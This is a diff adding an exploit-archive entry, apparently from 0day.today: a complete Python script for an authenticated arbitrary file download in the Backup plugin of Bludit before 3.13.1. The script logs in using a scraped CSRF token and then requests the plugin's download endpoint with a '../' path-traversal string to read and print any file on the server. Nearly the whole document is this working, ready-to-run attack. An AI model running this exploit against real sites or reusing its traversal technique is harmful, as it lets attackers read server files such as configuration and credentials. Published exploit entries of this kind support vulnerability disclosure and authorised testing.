@@ -1,0 +1,63 @@
+id: 38813
+date: 06/26/2023
+title: Bludit < 3.13.1 Backup Plugin - Arbitrary File Download (Authenticated) Exploit
+author: Antonio Cuomo
+cves: 
+
+# -*- coding: utf-8 -*-
+#/usr/bin/env python
+
+# Exploit Title: Bludit < 3.13.1 Backup Plugin - Arbitrary File Download (Authenticated)
+# Date: 2022-07-21
+# Exploit Author: Antonio Cuomo (arkantolo)
+# Vendor Homepage: https://www.bludit.com
+# Software Link: https://github.com/bludit/bludit
+# Version: < 3.13.1
+# Tested on: Debian 10 - PHP Version: 7.3.14
+
+import requests
+import argparse
+from bs4 import BeautifulSoup #pip3 install beautifulsoup4
+
+def main():
+        parser = argparse.ArgumentParser(description='Bludit < 3.13.1 - Backup Plugin - Arbitrary File Download (Authenticated)')
+        parser.add_argument('-x', '--url', type=str, required=True)
+        parser.add_argument('-u', '--user', type=str, required=True)
+        parser.add_argument('-p', '--password', type=str, required=True)
+        parser.add_argument('-f', '--file', type=str, required=True)
+        args = parser.parse_args()
+        print("\nBludit < 3.13.1 - Backup Plugin - Arbitrary File Download (Authenticated)","\nExploit Author: Antonio Cuomo (Arkantolo)\n")
+        exploit(args)
+
+def exploit(args):
+    s2 = requests.Session()
+
+    url = args.url.rstrip("/")
+
+    #get csrf token
+    r = s2.get(url+'/admin/')
+    soup = BeautifulSoup(r.text, 'html.parser')
+    formtoken = soup.find('input', {'name':'tokenCSRF'})['value']
+
+    #login
+    body= {'tokenCSRF':formtoken,'username':args.user,'password':args.password}
+    r = s2.post(url+'/admin/', data=body, allow_redirects=False)
+    if(r.status_code==301 and r.headers['location'].find('/admin/dashboard') != -1):
+        print("[*] Login OK")
+    else:
+        print("[*] Login Failed")
+        exit(1)
+
+    #arbitrary download
+    r = s2.get(url+'/plugin-backup-download?file=../../../../../../../../'+args.file)
+    if(r.status_code==200 and len(r.content)>0):
+        print("[*] File:")
+        print(r.text)
+    else:
+        print("[*] Exploit Failed")
+        exit(1)
+
+if __name__ == '__main__':
+	main()
+
+#  0day.today [2023-06-26]  #
